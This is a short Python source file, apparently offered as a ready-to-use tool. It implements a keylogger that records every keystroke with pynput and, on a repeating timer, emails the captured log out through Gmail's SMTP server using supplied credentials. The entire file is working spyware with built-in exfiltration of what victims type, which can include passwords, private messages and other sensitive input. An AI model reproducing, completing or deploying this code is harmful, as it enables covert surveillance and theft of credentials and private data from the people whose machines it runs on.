import pynput.keyboard #pip install pynput
import threading #built in
import smtplib #built in

class Keylogger:
    def __init__(self, time_interval, email, password):
        self.log = "Keylogger started" #log is a string
        self.interval = time_interval
        self.email = email
        self.password = password

    def append_to_log(self, string):
        self.log = self.log + string #adds the string to the log

    def process_key_press(self, key):
        try:
            current_key = str(key.char) #if the key is a character
        except AttributeError:
            if key == key.space:
                current_key = " " #if the key is a space
            else:
                current_key = " " + str(key) + " " #if the key is a special key
        self.append_to_log(current_key)

    def report(self):
        self.send_mail(self.email, self.password, "\n\n" + self.log) #sends the log to the email
        self.log = "" #resets the log
        timer = threading.Timer(self.interval, self.report) #sets the timer
        timer.start()

    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587) #connects to the server
        server.starttls() #starts tls encryption
        server.login(email, password) #logs in to the email
        server.sendmail(email, email, message) #sends the email
        server.quit() #quits the server

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press) #starts the listener
        with keyboard_listener:
            self.report() #starts the report
            keyboard_listener.join() #waits for the listener to finish